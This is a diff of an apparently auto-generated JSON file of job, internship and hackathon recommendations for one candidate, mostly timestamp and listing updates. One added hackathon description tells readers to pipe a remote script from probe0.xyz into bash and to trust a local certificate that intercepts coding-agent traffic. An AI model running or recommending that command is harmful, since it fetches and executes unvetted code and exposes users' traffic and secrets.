@@ -2,6 +2,28 @@
   "candidate": "Devojit Mandal",
   "top_jobs": [
     {
+      "id": "qualcomm_3099142",
+      "title": "FY27 Intern - Digital Design Engineering Intern - Canada (16 months)",
+      "company": "Qualcomm",
+      "location": "Bengaluru / Hyderabad, India",
+      "description": "Qualcomm student/interim engineering internship opportunity.",
+      "skills_hint": [
+        "Hardware",
+        "RTL",
+        "Embedded",
+        "Qualcomm"
+      ],
+      "deadline": "Open / Apply on Qualcomm Careers",
+      "url": "https://careers.qualcomm.com/careers/job/3099142",
+      "source": "Qualcomm Careers Direct",
+      "fetched_at": "2026-11-19T22:22:53.649131+00:00",
+      "match_score": 95,
+      "matching_skills": [
+        "RTL",
+        "Git"
+      ]
+    },
+    {
       "id": "qualcomm_3095057",
       "title": "Intern Hardware Engineer (Embedded Systems and Python)",
       "company": "Qualcomm",
@@ -16,33 +38,11 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3095057",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333724+00:00",
+      "fetched_at": "2026-11-19T22:22:54.287944+00:00",
       "match_score": 95,
       "matching_skills": [
         "HARDWARE",
         "Python"
-      ]
-    },
-    {
-      "id": "qualcomm_3093661",
-      "title": "Intern Hardware Engineer Digital PDTE",
-      "company": "Qualcomm",
-      "location": "Bengaluru / Hyderabad, India",
-      "description": "Qualcomm student/interim engineering internship opportunity.",
-      "skills_hint": [
-        "Hardware",
-        "RTL",
-        "Embedded",
-        "Qualcomm"
-      ],
-      "deadline": "Open / Apply on Qualcomm Careers",
-      "url": "https://careers.qualcomm.com/careers/job/3093661",
-      "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333742+00:00",
-      "match_score": 95,
-      "matching_skills": [
-        "HARDWARE",
-        "Git"
       ]
     },
     {
@@ -60,7 +60,29 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3093660",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333745+00:00",
+      "fetched_at": "2026-11-19T22:22:54.287950+00:00",
+      "match_score": 95,
+      "matching_skills": [
+        "HARDWARE",
+        "Git"
+      ]
+    },
+    {
+      "id": "qualcomm_3093661",
+      "title": "Intern Hardware Engineer Digital PDTE",
+      "company": "Qualcomm",
+      "location": "Bengaluru / Hyderabad, India",
+      "description": "Qualcomm student/interim engineering internship opportunity.",
+      "skills_hint": [
+        "Hardware",
+        "RTL",
+        "Embedded",
+        "Qualcomm"
+      ],
+      "deadline": "Open / Apply on Qualcomm Careers",
+      "url": "https://careers.qualcomm.com/careers/job/3093661",
+      "source": "Qualcomm Careers Direct",
+      "fetched_at": "2026-11-19T22:22:54.287952+00:00",
       "match_score": 95,
       "matching_skills": [
         "HARDWARE",
@@ -82,30 +104,11 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3095752",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333750+00:00",
+      "fetched_at": "2026-11-19T22:22:54.287959+00:00",
       "match_score": 95,
       "matching_skills": [
         "HARDWARE",
         "Git"
-      ]
-    },
-    {
-      "id": "unstop_1818258",
-      "title": "React Developer Internship",
-      "company": "ReflexWebs Solutions",
-      "location": "India (City)",
-      "description": "Internship at ReflexWebs Solutions",
-      "skills_hint": [
-        "developer"
-      ],
-      "deadline": "2026-12-02 (12 days left)",
-      "url": "https://unstop.com/internships/react-developer-intern-reflexwebs-solutions-1818258",
-      "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:52.462926+00:00",
-      "match_score": 85,
-      "matching_skills": [
-        "FRONTEND",
-        "React"
       ]
     },
     {
@@ -117,10 +120,10 @@
       "skills_hint": [
         "react"
       ],
-      "deadline": "2026-11-24 (4 days left)",
+      "deadline": "2026-11-24 (3 days left)",
       "url": "https://unstop.com/internships/ai-react-developer-internship-smaranaiin-1805059",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:54.451279+00:00",
+      "fetched_at": "2026-11-19T22:23:09.067380+00:00",
       "match_score": 85,
       "matching_skills": [
         "FRONTEND",
@@ -142,7 +145,28 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3098738",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:42.932757+00:00",
+      "fetched_at": "2026-11-19T22:22:53.649127+00:00",
+      "match_score": 80,
+      "matching_skills": [
+        "RTL"
+      ]
+    },
+    {
+      "id": "qualcomm_3099058",
+      "title": "FY27 Intern - Display IP FPGA Emulation Intern - Canada (4 months)",
+      "company": "Qualcomm",
+      "location": "Bengaluru / Hyderabad, India",
+      "description": "Qualcomm student/interim engineering internship opportunity.",
+      "skills_hint": [
+        "Hardware",
+        "RTL",
+        "Embedded",
+        "Qualcomm"
+      ],
+      "deadline": "Open / Apply on Qualcomm Careers",
+      "url": "https://careers.qualcomm.com/careers/job/3099058",
+      "source": "Qualcomm Careers Direct",
+      "fetched_at": "2026-11-19T22:22:53.649134+00:00",
       "match_score": 80,
       "matching_skills": [
         "RTL"
@@ -163,49 +187,7 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3098439",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:42.932758+00:00",
-      "match_score": 80,
-      "matching_skills": [
-        "HARDWARE"
-      ]
-    },
-    {
-      "id": "qualcomm_3099058",
-      "title": "FY27 Intern - Display IP FPGA Emulation Intern - Canada (4 months)",
-      "company": "Qualcomm",
-      "location": "Bengaluru / Hyderabad, India",
-      "description": "Qualcomm student/interim engineering internship opportunity.",
-      "skills_hint": [
-        "Hardware",
-        "RTL",
-        "Embedded",
-        "Qualcomm"
-      ],
-      "deadline": "Open / Apply on Qualcomm Careers",
-      "url": "https://careers.qualcomm.com/careers/job/3099058",
-      "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:42.932765+00:00",
-      "match_score": 80,
-      "matching_skills": [
-        "RTL"
-      ]
-    },
-    {
-      "id": "qualcomm_3095120",
-      "title": "Intern Hardware Engineer (Electronics Engineer)",
-      "company": "Qualcomm",
-      "location": "Bengaluru / Hyderabad, India",
-      "description": "Qualcomm student/interim engineering internship opportunity.",
-      "skills_hint": [
-        "Hardware",
-        "RTL",
-        "Embedded",
-        "Qualcomm"
-      ],
-      "deadline": "Open / Apply on Qualcomm Careers",
-      "url": "https://careers.qualcomm.com/careers/job/3095120",
-      "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333741+00:00",
+      "fetched_at": "2026-11-19T22:22:53.649136+00:00",
       "match_score": 80,
       "matching_skills": [
         "HARDWARE"
@@ -226,7 +208,28 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3099170",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333744+00:00",
+      "fetched_at": "2026-11-19T22:22:54.287931+00:00",
+      "match_score": 80,
+      "matching_skills": [
+        "HARDWARE"
+      ]
+    },
+    {
+      "id": "qualcomm_3095120",
+      "title": "Intern Hardware Engineer (Electronics Engineer)",
+      "company": "Qualcomm",
+      "location": "Bengaluru / Hyderabad, India",
+      "description": "Qualcomm student/interim engineering internship opportunity.",
+      "skills_hint": [
+        "Hardware",
+        "RTL",
+        "Embedded",
+        "Qualcomm"
+      ],
+      "deadline": "Open / Apply on Qualcomm Careers",
+      "url": "https://careers.qualcomm.com/careers/job/3095120",
+      "source": "Qualcomm Careers Direct",
+      "fetched_at": "2026-11-19T22:22:54.287947+00:00",
       "match_score": 80,
       "matching_skills": [
         "HARDWARE"
@@ -247,7 +250,7 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3098299",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333746+00:00",
+      "fetched_at": "2026-11-19T22:22:54.287954+00:00",
       "match_score": 80,
       "matching_skills": [
         "HARDWARE"
@@ -268,10 +271,53 @@
       "deadline": "Open / Apply on Qualcomm Careers",
       "url": "https://careers.qualcomm.com/careers/job/3098415",
       "source": "Qualcomm Careers Direct",
-      "fetched_at": "2026-11-18T22:14:43.333749+00:00",
+      "fetched_at": "2026-11-19T22:22:54.287957+00:00",
       "match_score": 80,
       "matching_skills": [
         "HARDWARE"
+      ]
+    },
+    {
+      "id": "remoteok_1137805",
+      "title": "SEO Full Stack Engineer",
+      "company": "Treatwell",
+      "location": "",
+      "description": "full stack, react, rabbitmq, front end, technical, customer support, dev, testing, marketing, design, web dev, exec, devops, finance, java, postgres, typescript, seo, senior, stats, engineer, recruiter, backend, digital nomad",
+      "skills_hint": [
+        "full stack",
+        "react",
+        "rabbitmq",
+        "front end",
+        "technical",
+        "customer support",
+        "dev",
+        "testing",
+        "marketing",
+        "design",
+        "web dev",
+        "exec",
+        "devops",
+        "finance",
+        "java",
+        "postgres",
+        "typescript",
+        "seo",
+        "senior",
+        "stats",
+        "engineer",
+        "recruiter",
+        "backend",
+        "digital nomad"
+      ],
+      "deadline": "Active",
+      "url": "https://remoteOK.com/remote-jobs/remote-seo-full-stack-engineer-treatwell-1137805",
+      "source": "RemoteOK",
+      "fetched_at": "2026-11-19T22:23:13.817053+00:00",
+      "match_score": 75,
+      "matching_skills": [
+        "FRONTEND",
+        "React",
+        "Git"
       ]
     },
     {
@@ -304,7 +350,7 @@
       "deadline": "Active",
       "url": "https://remoteOK.com/remote-jobs/remote-ui-developer-rainfocus-1137704",
       "source": "RemoteOK",
-      "fetched_at": "2026-11-18T22:14:57.634255+00:00",
+      "fetched_at": "2026-11-19T22:23:13.817171+00:00",
       "match_score": 75,
       "matching_skills": [
         "FRONTEND",
@@ -321,10 +367,10 @@
       "skills_hint": [
         "electronics"
       ],
-      "deadline": "2026-11-26 (6 days left)",
+      "deadline": "2026-11-26 (5 days left)",
       "url": "https://unstop.com/internships/electronics-communication-engineering-internship-johnnette-technologies-pvt-ltd-1807072",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:48.923899+00:00",
+      "fetched_at": "2026-11-19T22:23:01.662691+00:00",
       "match_score": 70,
       "matching_skills": [
         "HARDWARE"
@@ -339,10 +385,10 @@
       "skills_hint": [
         "electronics"
       ],
-      "deadline": "2026-11-28 (8 days left)",
+      "deadline": "2026-11-28 (7 days left)",
       "url": "https://unstop.com/internships/electronics-internship-emg-signal-acquisition-sensing-firmware-swethareddy-innovations-pvt-ltd-1810718",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:48.923920+00:00",
+      "fetched_at": "2026-11-19T22:23:01.662710+00:00",
       "match_score": 70,
       "matching_skills": [
         "HARDWARE"
@@ -357,10 +403,10 @@
       "skills_hint": [
         "hardware"
       ],
-      "deadline": "2026-11-27 (7 days left)",
+      "deadline": "2026-11-27 (6 days left)",
       "url": "https://unstop.com/internships/hardware-internship-thales-group-1807657",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:49.777146+00:00",
+      "fetched_at": "2026-11-19T22:23:02.740211+00:00",
       "match_score": 70,
       "matching_skills": [
         "HARDWARE"
@@ -375,10 +421,10 @@
       "skills_hint": [
         "robotics"
       ],
-      "deadline": "2026-11-28 (8 days left)",
+      "deadline": "2026-11-28 (7 days left)",
       "url": "https://unstop.com/internships/cad-design-internship-soft-robotics-mold-design-fusion-360-swethareddy-innovations-pvt-ltd-1810229",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:51.963482+00:00",
+      "fetched_at": "2026-11-19T22:23:05.629101+00:00",
       "match_score": 70,
       "matching_skills": [
         "IOT"
@@ -393,10 +439,46 @@
       "skills_hint": [
         "developer"
       ],
-      "deadline": "2026-11-27 (7 days left)",
+      "deadline": "2026-11-27 (6 days left)",
       "url": "https://unstop.com/internships/frontend-developer-internship-rentalos-1807884",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:52.462909+00:00",
+      "fetched_at": "2026-11-19T22:23:06.320770+00:00",
+      "match_score": 70,
+      "matching_skills": [
+        "FRONTEND"
+      ]
+    },
+    {
+      "id": "unstop_1819994",
+      "title": "Frontend Developer Internship",
+      "company": "Internship Mela",
+      "location": "India (City)",
+      "description": "Internship at Internship Mela",
+      "skills_hint": [
+        "developer"
+      ],
+      "deadline": "2026-12-04 (14 days left)",
+      "url": "https://unstop.com/internships/frontend-developer-internship-internship-mela-1819994",
+      "source": "Unstop Internships",
+      "fetched_at": "2026-11-19T22:23:06.320795+00:00",
+      "match_score": 70,
+      "matching_skills": [
+        "FRONTEND"
+      ]
+    },
+    {
+      "id": "unstop_1819464",
+      "title": "Frontend Developer Internship",
+      "company": "Clarity2Cloud Technology Private Limited",
+      "location": "India (City)",
+      "description": "Internship at Clarity2Cloud Technology Private Limited",
+      "skills_hint": [
+        "developer"
+      ],
+      "deadline": "2026-12-03 (13 days left)",
+      "url": "https://unstop.com/internships/frontend-developer-internship-clarity2cloud-technology-private-limited-1819464",
+      "source": "Unstop Internships",
+      "fetched_at": "2026-11-19T22:23:06.320798+00:00",
       "match_score": 70,
       "matching_skills": [
         "FRONTEND"
@@ -411,10 +493,10 @@
       "skills_hint": [
         "developer"
       ],
-      "deadline": "2026-11-26 (6 days left)",
+      "deadline": "2026-11-26 (5 days left)",
       "url": "https://unstop.com/internships/full-stack-developer-internship-mystical-views-private-limited-1806812",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:52.462930+00:00",
+      "fetched_at": "2026-11-19T22:23:06.320808+00:00",
       "match_score": 70,
       "matching_skills": [
         "FRONTEND"
@@ -429,10 +511,10 @@
       "skills_hint": [
         "developer"
       ],
-      "deadline": "2026-11-28 (8 days left)",
+      "deadline": "2026-11-28 (7 days left)",
       "url": "https://unstop.com/internships/full-stack-developer-internship-confluent-solutions-1783722",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:52.462932+00:00",
+      "fetched_at": "2026-11-19T22:23:06.320811+00:00",
       "match_score": 70,
       "matching_skills": [
         "FRONTEND"
@@ -447,28 +529,10 @@
       "skills_hint": [
         "developer"
       ],
-      "deadline": "2026-11-28 (8 days left)",
+      "deadline": "2026-11-28 (7 days left)",
       "url": "https://unstop.com/internships/full-stack-developer-internship-cognirex-solutions-1810078",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:52.462934+00:00",
-      "match_score": 70,
-      "matching_skills": [
-        "FRONTEND"
-      ]
-    },
-    {
-      "id": "unstop_1802356",
-      "title": "Full Stack Developer Internship",
-      "company": "Evolveo",
-      "location": "India (City)",
-      "description": "Internship at Evolveo",
-      "skills_hint": [
-        "developer"
-      ],
-      "deadline": "2026-11-23 (4 days left)",
-      "url": "https://unstop.com/internships/full-stack-developer-internship-evolveo-1802356",
-      "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:52.462936+00:00",
+      "fetched_at": "2026-11-19T22:23:06.320816+00:00",
       "match_score": 70,
       "matching_skills": [
         "FRONTEND"
@@ -483,10 +547,10 @@
       "skills_hint": [
         "frontend"
       ],
-      "deadline": "2026-11-24 (4 days left)",
+      "deadline": "2026-11-24 (3 days left)",
       "url": "https://unstop.com/internships/frontend-and-backend-internship-accesco-living-1804646",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:56.068502+00:00",
+      "fetched_at": "2026-11-19T22:23:11.787323+00:00",
       "match_score": 70,
       "matching_skills": [
         "FRONTEND"
@@ -501,31 +565,13 @@
       "skills_hint": [
         "frontend"
       ],
-      "deadline": "2026-12-10 (21 days left)",
+      "deadline": "2026-12-10 (20 days left)",
       "url": "https://unstop.com/internships/frontend-development-internship-codeatrix-1803889",
       "source": "Unstop Internships",
-      "fetched_at": "2026-11-18T22:14:56.068524+00:00",
+      "fetched_at": "2026-11-19T22:23:11.787342+00:00",
       "match_score": 70,
       "matching_skills": [
         "FRONTEND"
-      ]
-    },
-    {
-      "id": "arbeitnow_9947e4f82aaa",
-      "title": "FPGA Engineer Intern",
-      "company": "Harmattan Ai",
-      "location": "Lausanne",
-      "description": "R&D",
-      "skills_hint": [
-        "R&D"
-      ],
-      "deadline": "Rolling / Open",
-      "url": "https://www.arbeitnow.ch/jobs/companies/harmattan-ai/fpga-engineer-intern-lausanne-413687",
-      "source": "Arbeitnow",
-      "fetched_at": "2026-11-18T22:14:58.057446+00:00",
-      "match_score": 70,
-      "matching_skills": [
-        "RTL"
       ]
     }
   ],
@@ -542,7 +588,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://codefestthon.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649942+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300091+00:00",
       "match_score": 99,
       "matching_skills": [
         "AI",
@@ -550,6 +596,28 @@
         "WEB",
         "HACK",
         "CODE"
+      ]
+    },
+    {
+      "id": "devfolio_931ca9149c46417bb0526ce1eb44b920",
+      "name": "MakerSpark",
+      "platform": "Devfolio",
+      "tagline": "",
+      "description": "**MakerSpark** is an 8-hour hardware-only hackathon organized by the **IEEE Sensors Council Kerala Chapter**, in collaboration with **Arduino, Maker Village, and Semicon Keralam**. Hosted at the **Indian Institute of Information Technology and Management–Kerala (IIITM-K), Technopark, Thiruvananthapuram**, the event brings together aspiring innovators, engineers, and technology enthusiasts to transform creative ideas into impactful hardware solutions.\n\nShortlisted participants will be provided with **Arduino UNO Q** boards and will be required to develop Physical AI-based projects **using the board as a mandatory component** during the hackathon.\n\n\n***TRACKS***\n**1. Industry 2.0 – The Future of Automation**\nCentred on the future of industries, exploring intelligent automation, industrial transformation, robotics, and the evolution of manufacturing and production systems.\n\n**2. HealthTech – Beyond Boundaries**\nExploring the role of technology in revolutionising healthcare, focusing on medical innovation, healthcare accessibility, patient well-being, and advancements in health technologies.\n\n**3. Utopia – Envisioning a Better World**\nDedicated to technological innovation for a better future, encompassing sustainability, environmental protection, smart living, and solutions to societal challenges.\n\n**4. Odyssey – A Journey to Limitless Possibilities**\nIdeas that transcend conventional domains, embracing interdisciplinary innovation, emerging technologies, creative problem-solving, and unexplored possibilities.\n\n**Join our community :**\nhttps://chat.whatsapp.com/LPajlPT39biATzNpKs3tLW",
+      "dates": "2026-12-09 to 2026-12-09",
+      "location": "IIITMK Building, Technopark Road, Technopark Campus, Karyavattom, Kazhakkoottam, Thiruvananthapuram, Keralam, India",
+      "is_online": false,
+      "prizes": "Prize pool & perks listed on site",
+      "url": "https://makerspark.devfolio.co",
+      "source": "Devfolio API",
+      "fetched_at": "2026-11-19T22:22:51.300125+00:00",
+      "match_score": 99,
+      "matching_skills": [
+        "AI",
+        "HARDWARE",
+        "ROBOTICS",
+        "HACK",
+        "INNOVAT"
       ]
     },
     {
@@ -564,7 +632,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://clash-of-commits.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649952+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300128+00:00",
       "match_score": 99,
       "matching_skills": [
         "AI",
@@ -586,7 +654,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://haxfinity.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649966+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300149+00:00",
       "match_score": 99,
       "matching_skills": [
         "AI",
@@ -608,7 +676,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://innerve-11.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649972+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300158+00:00",
       "match_score": 99,
       "matching_skills": [
         "AI",
@@ -630,7 +698,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://touch-some-grass.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973967+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733385+00:00",
       "match_score": 99,
       "matching_skills": [
         "AI",
@@ -652,7 +720,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://coderave-2.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973970+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733391+00:00",
       "match_score": 99,
       "matching_skills": [
         "AI",
@@ -674,7 +742,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://eclipse.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973975+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733398+00:00",
       "match_score": 99,
       "matching_skills": [
         "AI",
@@ -696,7 +764,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://devnexus2.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649939+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300114+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
@@ -710,14 +778,14 @@
       "name": "Code N Mod",
       "platform": "Devfolio",
       "tagline": "Learn the craft. Build the game. Play your creation.",
-      "description": "## About the Event\n\nOrganized by **32BIT — Game Development Club of Siddaganga Institute of Technology (SIT), Tumakuru**, this one-day, offline event brings together students interested in gaming, programming, game design, and interactive experiences.\n\nThe event will begin with an engaging morning session featuring guest speakers, discussions, Q&A, and a practical game-development workshop. Participants will get an opportunity to learn from experienced individuals and explore the process of creating games.\n\nIn the afternoon, participants will take part in an open-format game-development hackathon. There is no fixed theme, so participants can build any type of game using their preferred game engine, programming language, and tools.\n\nParticipants can compete individually or form teams of up to six members. Games will be evaluated by judges, with prizes awarded to the top three entries.\n\nWhether you are an experienced developer, an aspiring game designer, or someone curious about how games are made, this event is an opportunity to learn, experiment, collaborate, and turn ideas into playable experiences.\n\n### Event Highlights\n- Guest talks and interactive discussions\n- Practical game-development workshop\n- Open-theme game-development hackathon\n- Freedom to use your preferred tools and technologies\n- Solo participation or teams of up to six\n- Prizes for the top three teams or entries\n- Digital participation certificates\n\n### Event Format\n- **Mode:** Offline\n- **Duration:** One day\n- **Proposed timing:** 8:00 AM–7:00 PM\n- **Organized by:** 32BIT — Game Development Club, SIT\n- **Venue:** Birla Auditorium\n- **Registration fee:** Free, subject to registration details and capacity\n\nWebsite:  https://32bitsit.xyz",
+      "description": "## About the Event\n\nOrganized by **32BIT — Game Development Club of Siddaganga Institute of Technology (SIT), Tumakuru**, this one-day, offline event brings together students interested in gaming, programming, game design, and interactive experiences.\n\nThe event will begin with an engaging morning session featuring guest speakers, discussions, Q&A, and a practical game-development workshop. Participants will get an opportunity to learn from experienced individuals and explore the process of creating games.\n\nIn the afternoon, participants will take part in an open-format game-development hackathon. There is no fixed theme, so participants can build any type of game using their preferred game engine, programming language, and tools.\n\nParticipants can compete individually or form teams of up to six members. Games will be evaluated by judges, with prizes awarded to the top three entries.\n\nWhether you are an experienced developer, an aspiring game designer, or someone curious about how games are made, this event is an opportunity to learn, experiment, collaborate, and turn ideas into playable experiences.\n\n### Event Highlights\n- Guest talks and interactive discussions\n- Practical game-development workshop\n- Open-theme game-development hackathon\n- Freedom to use your preferred tools and technologies\n- Solo participation or teams of up to six\n- Prizes for the top three teams or entries\n- Digital participation certificates\n\n### Event Format\n- **Mode:** Offline\n- **Duration:** One day\n- **Workshop Timing:** 8:00 AM – 12:00 PM\n- **Workshop Venue:** Media Center\n- **Hackathon Timing:** 2:00 PM – 7:00 PM\n- **Hackathon Venue:** Birla Auditorium\n- **Organized by:** 32BIT — Game Development Club, SIT\n- **Registration Fee:** Free, subject to registration details and capacity\n\nWebsite:  https://32bitsit.xyz",
       "dates": "2026-11-23 to 2026-11-23",
       "location": "Siddaganga Institute Of Technology, Chandana Complex, Tumakur, Karnataka, India",
       "is_online": false,
       "prizes": "Prize pool & perks listed on site",
       "url": "https://codenmod.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649944+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300118+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
@@ -738,7 +806,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://health-hackathon.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649958+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300134+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
@@ -759,7 +827,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://hft2026.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649960+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300140+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
@@ -780,7 +848,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://hackodisha-6a.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649964+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300147+00:00",
       "match_score": 95,
       "matching_skills": [
         "WEB",
@@ -801,7 +869,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://hacksprint-3.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649971+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300154+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
@@ -822,12 +890,33 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://texus27.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973962+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733378+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
         "WEB",
         "HACK",
+        "INNOVAT"
+      ]
+    },
+    {
+      "id": "devfolio_4a726052359d4ba8af95d60e9dc253cf",
+      "name": "Makeathon 9.0",
+      "platform": "Devfolio",
+      "tagline": "One of North-India's largest hackathon",
+      "description": "Now in its ninth edition, **MAKEATHON 9.0** is the flagship hackathon of the Microsoft Learn Student Chapter. It brings together developers, designers, and problem solvers from across the country to turn ideas into working solutions. Through workshops, mentorship, and a focused 24-hour building experience, participants will explore real-world challenges and demonstrate what they can create together.\n\n**Who can participate?**\n\nUndergraduate and postgraduate students from all colleges, academic years, and disciplines are welcome. Teams can include students from different colleges and disciplines. A mix of skills in development, design, AI/ML, and databases is encouraged.\n\nEach team must choose one problem statement from the officially released list and build a solution that directly addresses it.\n\n**Round 1 — Online Screening**\n\nTeams must submit:\n\n- A project proposal explaining the problem, proposed solution, technical approach, and expected impact.\n- An implementation plan outlining how the solution will be developed.\n\nSubmissions will be evaluated on innovation, relevance, feasibility, and clarity. Shortlisted teams will advance to the on-campus hackathon.\n\n**Round 2 — On-Campus Hackathon**\n\nShortlisted teams will develop a functional prototype from scratch during the hackathon. Pre-built solutions or prototypes are not permitted, and physical attendance throughout the hackathon is compulsory.\n\nJudges will conduct periodic progress checkpoints, followed by a final evaluation.\n\n**Final Submission**\n\nEach team must provide:\n\n- A functional prototype with a live demonstration.\n- A GitHub repository containing the source code.\n- A project presentation with at least seven slides.\n- Project documentation.\n\nFinal evaluation will consider innovation, technical implementation, practicality, cost efficiency, and overall impact.\n\n**Participation Guidelines**\n\n- Register through the official platform using accurate participant details.\n- Work on only one official problem statement.\n- Submit original work. Plagiarism will result in disqualification.\n- Demonstrate your own understanding of the project and avoid AI-generated presentation content.\n- Join the official event community and follow the Code of Conduct.\n- Violations of event rules may result in disqualification. Judges’ decisions are final and binding.\n\n## Hackathon Resources\n\n**(A) [Access Langfuse Coding agent here all free!](https://langfuse.com/)**\n**Langfuse coupon code:** LF-NONPROFIT-X5MSL\n\n**(B) Probe0 setup documentation for Mac:**\n1. Open Terminal and run: curl -fsSL https://probe0.xyz/i/h-makeathon | bash\n2. Sign in once when asked, and enter the Mac password once. That trusts a local certificate, which is how probe0 sees the agent traffic.\n3. Open a new terminal and use Claude Code or Codex as usual. The probe0 dashboard shows what every call used.\n4. Nothing leaves the machine, and running probe0 uninstall removes everything.\n\nDemo [Link](https://drive.google.com/file/d/1zrEUf4iqlpyQarQhjkDI-3PLA29mAB2Y/view?usp=sharing) for Probe0 Setup\n\nThere is also a Mac app download [here](https://probe0.xyz/betaInstall)",
+      "dates": "2027-01-30 to 2027-01-31",
+      "location": "Thapar Institute of Engineering & Technology, Bhadson Road, Patiala, Punjab, India",
+      "is_online": false,
+      "prizes": "Prize pool & perks listed on site",
+      "url": "https://makeathon-9.devfolio.co",
+      "source": "Devfolio API",
+      "fetched_at": "2026-11-19T22:22:51.733382+00:00",
+      "match_score": 95,
+      "matching_skills": [
+        "AI",
+        "HACK",
+        "CODE",
         "INNOVAT"
       ]
     },
@@ -843,33 +932,12 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://hack2027.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973965+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733388+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
         "HARDWARE",
         "HACK",
-        "INNOVAT"
-      ]
-    },
-    {
-      "id": "devfolio_4a726052359d4ba8af95d60e9dc253cf",
-      "name": "Makeathon 9.0",
-      "platform": "Devfolio",
-      "tagline": "One of North-India's largest hackathon",
